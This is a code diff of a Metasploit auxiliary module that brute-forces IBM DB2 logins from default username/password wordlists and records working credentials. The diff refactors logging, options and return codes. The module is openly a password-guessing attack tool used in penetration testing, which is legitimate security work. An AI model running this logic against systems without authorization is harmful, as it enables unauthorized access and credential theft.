@@ -30,42 +30,41 @@ class Metasploit3 < Msf::Auxiliary
 			'Author'         => ['todb'],
 			'License'        => MSF_LICENSE
 		)
-		register_options(
-			[
-				OptBool.new('VERBOSE', [ true, 'Verbose output', false]),
-				OptPath.new('USERPASS_FILE',  [ false, "File containing (space-seperated) users and passwords, one pair per line", File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_userpass.txt") ]),
-				OptPath.new('USER_FILE',  [ false, "File containing users, one per line", File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_user.txt") ]),
-				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line", File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_pass.txt") ]),
+    
+    register_options(
+      [
+				OptPath.new('USERPASS_FILE',  [ false, "File containing (space-seperated) users and passwords, one pair per line",
+          File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_userpass.txt") ]),
+				OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
+          File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_user.txt") ]),
+				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
+          File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_pass.txt") ]),
 			], self.class)
-
+      
 		# Users must use user/pass/userpass files.
 		deregister_options('USERNAME' , 'PASSWORD')
 	end
 
 	def run_host(ip)
 			each_user_pass { |user, pass|
-				userpass_sleep_interval unless self.credentials_tried.empty?
-				this_cred = [user,ip,rport].join(":")
-				next if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred]
-				do_login(user,pass,this_cred,datastore['DATABASE'])
-				self.credentials_tried[this_cred] = pass
+        do_login(user,pass,datastore['DATABASE'])
 			}
 	end
 
-	def do_login(user=nil,pass=nil,this_cred=nil,db=nil)
+	def do_login(user=nil,pass=nil,db=nil)
 		verbose = datastore['VERBOSE']
 		datastore['USERNAME'] = user
 		datastore['PASSWORD'] = pass
-		print_status("Trying username:'#{user}' with password:'#{pass}' against #{rhost}:#{rport}") if verbose
+		vprint_status("#{rhost}:#{rport} - DB2 - Trying username:'#{user}' with password:'#{pass}'")
 
 		begin
 			info = db2_check_login
 		rescue ::Rex::ConnectionError
-			print_error("#{rhost}:#{rport} : Unable to attempt authentication") if verbose 
-			return :done
+			vprint_error("#{rhost}:#{rport} : Unable to attempt authentication") 
+			return :abort
 		rescue ::Rex::Proto::DRDA::RespError => e
-			print_error("#{rhost}:#{rport} : Error in connecting to DB2 instance: #{e}") if verbose 
-			return :error
+			vprint_error("#{rhost}:#{rport} : Error in connecting to DB2 instance: #{e}") 
+			return :abort
 		end
 			disconnect
 
@@ -77,9 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 			)
 
 			if info[:db_login_success]
-				print_good("#{rhost}:#{rport} DB2 - successful login for '#{user}' : '#{pass}' against database '#{db}'")
-				self.credentials_good[this_cred] = pass
-
+				print_good("#{rhost}:#{rport} - DB2 - successful login for '#{user}' : '#{pass}' against database '#{db}'")
 				# Report credentials
 				report_auth_info(
 					:host => rhost,
@@ -92,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
 				)
 				return :next_user
 			else
-				print_status("#{rhost}:#{rport} DB2 - failed login for '#{user}' : '#{pass}' against database '#{db}'") if verbose
+				vprint_status("#{rhost}:#{rport} - DB2 - failed login for '#{user}' : '#{pass}' against database '#{db}'")
 				return :fail
 			end
 
